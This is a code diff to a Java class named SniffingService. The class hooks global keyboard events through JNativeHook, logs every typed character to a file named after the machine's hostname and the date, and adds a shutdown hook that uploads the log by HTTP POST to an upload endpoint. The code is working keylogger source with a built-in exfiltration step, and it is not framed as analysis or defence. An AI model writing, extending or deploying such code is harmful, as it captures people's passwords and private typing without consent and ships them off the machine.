@@ -4,11 +4,21 @@ import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+import org.apache.hc.client5.http.classic.methods.HttpPost;
+import org.apache.hc.client5.http.entity.mime.MultipartEntityBuilder;
+import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
+import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
+import org.apache.hc.client5.http.impl.classic.HttpClients;
+import org.apache.hc.core5.http.HttpEntity;
+import org.apache.hc.core5.http.ParseException;
+import org.apache.hc.core5.http.io.entity.EntityUtils;
 
-import java.io.BufferedWriter;
-import java.io.FileWriter;
+import java.io.File;
 import java.io.IOException;
 import java.io.RandomAccessFile;
+import java.net.InetAddress;
+import java.net.http.HttpClient;
+import java.time.LocalDate;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -16,12 +26,51 @@ public class SniffingService implements NativeKeyListener {
     private RandomAccessFile writer;
 
     public SniffingService() {
+        HttpClient client = HttpClient.newHttpClient();
+        final String pathName = "log" + getSystemName() + " " + LocalDate.now() + ".txt";
         try {
-            writer = new RandomAccessFile("log.txt", "rw");
+            writer = new RandomAccessFile(pathName, "rw");
             writer.seek(writer.length());
         } catch (IOException e) {
             e.printStackTrace();
         }
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            System.out.println("Program is being forced to stop.");
+            File file = new File(pathName);
+
+            // Create CloseableHttpClient
+            try (CloseableHttpClient httpClient = HttpClients.createDefault()) {
+
+                // Create the POST request
+                HttpPost uploadFile = new HttpPost("http://localhost:8080/upload");
+
+                // Build the multipart request with the file
+                HttpEntity multipartEntity = MultipartEntityBuilder.create()
+                        .addBinaryBody("file", file)  // "file" is the form field name expected by the server
+                        .build();
+
+                // Set the multipart entity as the request body
+                uploadFile.setEntity(multipartEntity);
+
+                // Execute the request
+                try (CloseableHttpResponse response = httpClient.execute(uploadFile)) {
+                    // Print the response details
+                    System.out.println("Response code: " + response.getCode());
+                    System.out.println("Response body: " + EntityUtils.toString(response.getEntity()));
+                } catch (ParseException e) {
+                    throw new RuntimeException(e);
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            try {
+                if (writer != null) {
+                    writer.close();
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }));
     }
 
     public void startSniffing() {
@@ -49,25 +98,32 @@ public class SniffingService implements NativeKeyListener {
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
-
-        if (Character.isDefined(e.getKeyChar()) && !Character.isISOControl(e.getKeyChar())) {
+        if (Character.isDefined(e.getKeyChar()) && !Character.isISOControl(e.getKeyChar()))
             logKey(e.getKeyChar() + "");
-        } /*else if (e.getKeyChar()) {
-            removeLastCharacter();
-            System.out.println("Backspace");
-        }*/
     }
+
     private boolean isBackspace(int keyCode) {
         return keyCode == 0;
     }
+
     private void removeLastCharacter() {
         try {
-            long length = writer.length() ;
-            if(length > 0)
+            long length = writer.length();
+            if (length > 0)
                 writer.setLength(length - 1);
         } catch (IOException e) {
             e.printStackTrace();
         }
+    }
+
+    private String getSystemName() {
+        String systemName = null;
+        try {
+            systemName = InetAddress.getLocalHost().getHostName();
+        } catch (Exception E) {
+            System.err.println(E.getMessage());
+        }
+        return systemName;
     }
 }
 
